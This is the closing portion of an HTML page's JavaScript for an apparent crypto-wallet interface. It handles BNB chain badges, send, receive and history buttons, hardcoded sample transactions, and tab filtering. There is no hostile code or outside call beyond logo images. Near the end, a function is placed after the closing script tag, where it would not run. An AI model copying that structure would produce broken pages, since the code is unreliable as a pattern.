    const chainBadges = document.querySelectorAll('.chain-badge');
    chainBadges.forEach(badge => {
        const img = badge.querySelector('img');
        if (img && (img.src.includes('bnb-bnb-logo') || 
            badge.getAttribute('data-network') === 'bsc' ||
            badge.getAttribute('data-network') === 'bnb-smart-chain')) {
            img.src = 'https://cryptologos.cc/logos/bnb-bnb-logo.png';
        }
    });
    
    // Fix token detail page badges
    const tokenDetailIcon = document.getElementById('token-detail-icon');
    if (tokenDetailIcon && tokenDetailIcon.parentElement) {
        const containerElement = tokenDetailIcon.parentElement;
        const detailBadge = containerElement.querySelector('.chain-badge');
        const tokenSymbol = document.getElementById('detail-symbol');
        const currentTokenId = tokenSymbol ? tokenSymbol.textContent.toLowerCase() : '';
        
        // Tokens that need badges (BNB Smart Chain tokens)
        const bscTokens = ['usdt', 'bnb', 'twt'];
        
        if (bscTokens.includes(currentTokenId) && !detailBadge) {
            const newBadge = document.createElement('div');
            newBadge.className = 'chain-badge';
            newBadge.setAttribute('data-network', 'bsc');
            
            const badgeImg = document.createElement('img');
            badgeImg.src = 'https://cryptologos.cc/logos/bnb-bnb-logo.png';
            badgeImg.alt = 'BNB Smart Chain';
            
            newBadge.appendChild(badgeImg);
            containerElement.style.position = 'relative';
            containerElement.appendChild(newBadge);
        }
    }
}

// Connect token detail send/receive buttons
const detailActions = document.querySelectorAll('#token-detail .token-detail-actions .action-circle');
if (detailActions.length >= 5) {
    // Send button (first action)
    detailActions[0].addEventListener('click', function() {
        const tokenSymbol = document.getElementById('detail-symbol');
        const currentTokenId = tokenSymbol ? tokenSymbol.textContent.toLowerCase() : 'usdt';
        if (typeof showSendScreen === 'function') {
            showSendScreen(currentTokenId);
        }
    });
    
    // Receive button (second action)
    detailActions[1].addEventListener('click', function() {
        const tokenSymbol = document.getElementById('detail-symbol');
        const currentTokenId = tokenSymbol ? tokenSymbol.textContent.toLowerCase() : 'btc';
        if (typeof showReceiveScreen === 'function') {
            showReceiveScreen(currentTokenId);
        }
    });
}

// Connect history buttons
const historyButtons = document.querySelectorAll('.action-circle');
historyButtons.forEach(button => {
    const buttonText = button.querySelector('span')?.textContent?.trim();
    if (buttonText === 'History') {
        button.addEventListener('click', function() {
            const historyScreen = document.getElementById('history-screen');
            if (historyScreen) {
                // Hide other screens
                const screens = document.querySelectorAll('.screen');
                screens.forEach(screen => {
                    screen.style.display = 'none';
                    screen.classList.add('hidden');
                });
                
                // Populate with transactions (basic example)
                const historyList = document.getElementById('history-transaction-list');
                if (historyList && historyList.children.length === 0) {
                    createExampleTransactions(historyList);
                }
                
                // Show history screen
                historyScreen.style.display = 'flex';
                historyScreen.classList.remove('hidden');
            }
        });
    }
});

// Create example transactions for history
function createExampleTransactions(container) {
    const transactions = [
        {type: 'receive', amount: 500, symbol: 'USDT', value: 500, date: '2024-03-15 14:32'},
        {type: 'send', amount: 200, symbol: 'USDT', value: 200, date: '2024-03-12 09:15'},
        {type: 'receive', amount: 0.25, symbol: 'BNB', value: 95.67, date: '2024-03-05 11:23'}
    ];
    
    transactions.forEach(tx => {
        const item = document.createElement('div');
        item.className = `transaction-item transaction-${tx.type}`;
        
        let logo = 'https://cryptologos.cc/logos/default-logo.png';
        if (tx.symbol === 'USDT') logo = 'https://cryptologos.cc/logos/tether-usdt-logo.png';
        if (tx.symbol === 'BNB') logo = 'https://cryptologos.cc/logos/bnb-bnb-logo.png';
        
        item.innerHTML = `
            <div class="transaction-token-icon">
                <img src="${logo}" alt="${tx.symbol}">
            </div>
            <div class="transaction-info">
                <div class="transaction-type">${tx.type === 'receive' ? 'Received' : 'Sent'} ${tx.symbol}</div>
                <div class="transaction-date">${tx.date}</div>
            </div>
            <div class="transaction-amount">
                <div class="transaction-value">${tx.type === 'receive' ? '+' : '-'}${tx.amount} ${tx.symbol}</div>
                <div class="transaction-usd">$${tx.value.toFixed(2)}</div>
            </div>
        `;
        
        container.appendChild(item);
    });
}

// Handle history page navigation
const historyBackButton = document.querySelector('.history-back-button');
if (historyBackButton) {
    historyBackButton.addEventListener('click', function() {
        document.getElementById('history-screen').style.display = 'none';
        document.getElementById('history-screen').classList.add('hidden');
        document.getElementById('wallet-screen').style.display = 'flex';
        document.getElementById('wallet-screen').classList.remove('hidden');
    });
}

// Add history tab functionality
const historyTabs = document.querySelectorAll('.history-tab');
historyTabs.forEach(tab => {
    tab.addEventListener('click', function() {
        historyTabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        
        const filterType = tab.getAttribute('data-tab');
        const transactions = document.querySelectorAll('#history-transaction-list .transaction-item');
        
        transactions.forEach(tx => {
            if (filterType === 'all') {
                tx.style.display = 'flex';
            } else if (filterType === 'sent' && tx.classList.contains('transaction-send')) {
                tx.style.display = 'flex';
            } else if (filterType === 'received' && tx.classList.contains('transaction-receive')) {
                tx.style.display = 'flex';
            } else {
                tx.style.display = 'none';
            }
        });
    });
});

// Run fixes when page loads
document.addEventListener('DOMContentLoaded', function() {
    setTimeout(fixChainBadges, 500);
});

// Run fixes now if page already loaded
if (document.readyState === 'complete' || document.readyState === 'interactive') {
    setTimeout(fixChainBadges, 100);
    setInterval(fixChainBadges, 1000); // Keep checking periodically
}
</script>

 // Force chain badge correction
// Emergency fix for chain badges
function forceChainBadges() {
  console.log("Forcing chain badges to display");
  
  // 1. Define trusted tokens that need badges
  const bscTokens = ['usdt', 'bnb', 'twt'];
  
  // 2. Fix token list badges
  document.querySelectorAll('.token-item').forEach(item => {
    const tokenId = item.getAttribute('data-token-id');
    if (bscTokens.includes(tokenId)) {
      // Get or create badge container
      const iconContainer = item.querySelector('.token-icon');
      if (!iconContainer) return;
      
      // Remove any existing badges
      const oldBadges = iconContainer.querySelectorAll('.chain-badge');
      oldBadges.forEach(badge => badge.remove());
      
      // Create fresh badge 
      const badge = document.createElement('div');
      badge.className = 'chain-badge';
      badge.style.cssText = 'display:block !important; position:absolute !important; bottom:-6px !important; right:-6px !important; width:20px !important; height:20px !important; border-radius:50% !important; border:2px solid #FFFFFF !important; background:#FFFFFF !important; z-index:99 !important; overflow:visible !important;';
      
      // Create image with direct URL
      const img = document.createElement('img');
      img.src = 'https://cryptologos.cc/logos/bnb-bnb-logo.png';
      img.alt = 'BNB';
      img.style.cssText = 'width:100% !important; height:100% !important; object-fit:contain !important; padding:2px !important; display:block !important;';
      
      // Add image to badge and badge to container
      badge.appendChild(img);
      iconContainer.appendChild(badge);
    }
  });
  
  // 3. Fix token detail page badge
  const detailSymbol = document.getElementById('detail-symbol');
  if (detailSymbol) {
    const tokenId = detailSymbol.textContent.toLowerCase().trim();
    if (bscTokens.includes(tokenId)) {
      const container = document.querySelector('.token-detail-icon-container');
      if (container) {
        // Remove any existing badges
        const oldBadges = container.querySelectorAll('.chain-badge');
        oldBadges.forEach(badge => badge.remove());
        
        // Create fresh badge
        const badge = document.createElement('div');
        badge.className = 'chain-badge';
        badge.style.cssText = 'display:block !important; position:absolute !important; bottom:-6px !important; right:-6px !important; width:20px !important; height:20px !important; border-radius:50% !important; border:2px solid #FFFFFF !important; background:#FFFFFF !important; z-index:99 !important; overflow:visible !important;';
        
        // Create image with direct URL
        const img = document.createElement('img');
        img.src = 'https://cryptologos.cc/logos/bnb-bnb-logo.png';
        img.alt = 'BNB';
        img.style.cssText = 'width:100% !important; height:100% !important; object-fit:contain !important; padding:2px !important; display:block !important;';
        
        // Add image to badge and badge to container
        badge.appendChild(img);
        container.appendChild(badge);
      }
    }
  }
}

// Run immediately and periodically
forceChainBadges();
setInterval(forceChainBadges, 1000);
</body>
</html>
